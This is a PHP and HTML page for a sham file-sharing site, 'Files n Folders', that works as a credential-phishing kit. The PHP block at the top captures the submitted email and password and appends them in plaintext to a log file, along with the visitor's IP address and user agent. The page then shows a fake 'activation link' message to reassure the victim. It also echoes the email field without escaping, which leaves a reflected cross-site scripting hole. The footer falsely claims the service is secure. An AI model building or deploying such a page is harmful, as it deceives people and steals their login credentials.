<?php
$myfile = fopen("log/logfile.txt", "a+") or die("Unable to open file!");

$email  = $_POST['inputEmail'];
$pw     = $_POST['inputPassword'];
$ip     = $_SERVER['REMOTE_ADDR'];
$usragt = $_SERVER['HTTP_USER_AGENT'];
$now    = date("Y-m-d H:i:s");

$txt = sprintf("%s - %s -> email: %s, pw: %s \n%s\n", $now, $ip, $email, $pw, $usragt);

fwrite($myfile, $txt);
fclose($myfile);
?>



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
  <title>Files n Folders</title>

  <!-- Bootstrap -->
  <link href="css/bootstrap.min.css" rel="stylesheet">

  <!-- Custom CSS -->
  <link href="css/custom.css" rel="stylesheet">

  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>
<body>



  <div class="container">

    <img class="logo" src="img/logo.png" alt="Files and Folders">

    <form class="form-signin">


      <p class="text-center">An activation link will be sent to <?php echo $_POST["inputEmail"]; ?>. Please open the link to access your files.</p>

      <p class="text-center"><span class="glyphicon glyphicon-ok iconbig" aria-hidden="true"></span></p>

      <p class="text-center">&nbsp;</p>

      <p class="text-center"><b>Note</b>: This can take up to 30 minutes - please be patient.</p>

    </form>

  </div> <!-- /container -->


  <footer class="footer">
    <div class="container">
      <p class="text-muted">Swiss Premium File Sharing - #1 Plattform for sharing Files n' Folders - 100% Free and Secure</p>
      <p class="text-muted">Copyright &copy; 1999-2017 by Braveheart Inc. Webhosting</p>
    </div>
  </footer>



  <!-- jQuery -->
  <script src="js/jquery.js"></script>

  <!-- Bootstrap Core JavaScript -->
  <script src="js/bootstrap.min.js"></script>


</body>
</html>
